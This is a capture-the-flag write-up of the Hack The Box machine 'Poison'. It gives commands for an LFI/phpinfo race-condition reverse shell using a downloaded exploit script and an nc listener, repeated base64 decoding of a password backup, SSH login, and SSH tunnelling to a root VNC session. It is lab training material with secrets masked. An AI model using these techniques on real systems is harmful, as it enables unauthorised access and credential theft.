# Poison (HTB)

> Platform: Hack The Box  
> OS: FreeBSD  
> Difficulty: Medium  
> Result: root

---

## Attack Chain

```text
Reconnaissance
├── nmap -sC -sV -A → 22 (OpenSSH 7.2 FreeBSD), 80 (Apache 2.4.29 FreeBSD PHP/5.6.32)
└── / → "Temporary website to test local .php scripts"
    └── Links: ini.php, info.php, listfiles.php, phpinfo.php

Foothold (LFI Race Condition)
├── listfiles.php → pwdbackup.txt, browse.php
├── phpinfo.php → file_uploads = On (tmp_name offset)
├── phpinfolfi.py (PayloadsAllTheThings) → modifications:
│   ├── LFIREQ: /browse.php?file=%s
│   ├── payload: php reverse shell
│   └── fix bytes vs str (Python 3)
├── nc -lnvp 9001
└── python3 phpinfolfi.py 10.129.1.254 80 100 → www shell

Lateral Movement (Credentials)
├── /var/log/httpd-access.log (Apache access log path)
├── ps -aux → Xvnc :1 (root)
├── /usr/local/www/apache24/data/pwdbackup.txt
│   └── 13x base64 decode → <PASSWORD>
└── ssh charix@10.129.1.254 → user.txt

Privilege Escalation (VNC)
├── ~/secret.zip → scp → unzip (pass: <PASSWORD>)
├── netstat -an | grep LIST → 5801, 5901 (VNC localhost)
├── ssh -D 1080 -L6801:127.0.0.1:5801 -L6901:127.0.0.1:5901 charix@10.129.1.254
├── proxychains4.conf → socks5 127.0.0.1 1080
└── vncviewer -passwd secret 127.0.0.1::6901 → root.txt
```

> [!NOTE]
> All flags, passwords, hashes, and session tokens have been masked for ethical reasons.

---

## Machine Briefing

FreeBSD with Apache 2.4.29 + PHP 5.6.32. The main page lists test scripts. A VNC server runs on localhost as root.

---

## Reconnaissance

### Port Scan

```bash
sudo nmap -sC -sV -A -T4 -Pn 10.129.1.254
```

| Port | Service | Version                                |
|------|---------|----------------------------------------|
| 22   | SSH     | OpenSSH 7.2 (FreeBSD 20161230)         |
| 80   | HTTP    | Apache httpd 2.4.29 (FreeBSD) PHP/5.6.32 |

OS: FreeBSD 11.x.

---

## Foothold

### Exploring the site

```
http://10.129.1.254/
```

Title: "Temporary website to test local .php scripts."

| URL           | Purpose                                                |
|---------------|--------------------------------------------------------|
| ini.php       | PHP configuration dump                                 |
| info.php      | `uname`                                                |
| listfiles.php | file listing → pwdbackup.txt, browse.php               |
| phpinfo.php   | phpinfo, `file_uploads = On`                           |

No CVE (custom vulnerability) - phpinfo() is exposed, leaking the temporary upload path; combined with an LFI in browse.php this enables a race-condition RCE (phpinfolfi technique).

### LFI Race Condition (phpinfo)

```bash
wget https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/File%20Inclusion/Files/phpinfolfi.py
```

Modifications:
- Replace LFIREQ with `/browse.php?file=%s`
- Replace the PHP payload with a reverse shell
- Fix bytes handling (Python 3)

Field check:

```python
i = d.find(b"[tmp_name] =>")
if i == -1:
    i = d.find(b"[tmp_name] =&gt;")
```

Listener:

```bash
nc -lnvp 9001
```

Launch:

```bash
python3 phpinfolfi_modifyed.py 10.129.1.254 80 100
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

Shell as `www`.

### Post-exploitation enumeration

```bash
hostname
# Poison

ls /var/log
# httpd-access.log, httpd-error.log, ...

cd /home
ls -la
# charix (drwxr-x---)

ps -aux
# Xvnc :1 (root)
```

**Answer to the question "What is the full path to the Apache access logs?"** - `/var/log/httpd-access.log`.

### Credentials

```bash
cd /usr/local/www/apache24/data
cat pwdbackup.txt
```

Multi-layer base64 (13 times). Decoding:

```bash
for i in $(seq 1 13); do cat pwdbackup.txt | base64 -d > /tmp/step; mv /tmp/step pwdbackup.txt; done
cat pwdbackup.txt
```

Result: `<PASSWORD>`.

### SSH

```bash
ssh charix@10.129.1.254
# Password: <PASSWORD>
cat user.txt
# <USER_FLAG>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Privilege Escalation

### Files in the home directory

```bash
ls
# secret.zip
scp charix@10.129.1.254:secret.zip .
unzip secret.zip
# password: <PASSWORD>
```

Inside - binary data (VNC password).

### Detecting VNC

```bash
netstat -an | grep LIST
```

Ports 5801 and 5901 on localhost.

### Tunneling

`/etc/proxychains4.conf`:

```
socks5  127.0.0.1 1080
```

Launch:

```bash
ssh -D 1080 -L6801:127.0.0.1:5801 -L6901:127.0.0.1:5901 charix@10.129.1.254
```

### VNC connect

```bash
vncviewer -passwd secret 127.0.0.1::6901
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

Via VNC, we access the root desktop. Read `root.txt`.

---

## Flags

| Flag | Value                            |
|------|----------------------------------|
| User | <USER_FLAG> |
| Root | (see `/root/root.txt` via VNC)   |

---

## Key Takeaways

- **LFI via phpinfo + race condition** - an open `phpinfo()` reveals the temporary path of an uploaded file; by winning the race between writing the tmp file and its deletion, you can execute it via LFI.
- **Multi-layer base64** - check whether the string decodes repeatedly; use a `for` loop.
- **VNC on localhost** - a standard SSH tunnel (`-D` + `-L`) solves access to an isolated service.
- **VNC password in secret.zip** - a classic pattern of storing credential files alongside SSH access.
- **Alternative vector - log poisoning** - the Apache access log is readable and writable via User-Agent, but in this case writing from `www` is not possible, which rules out this path.
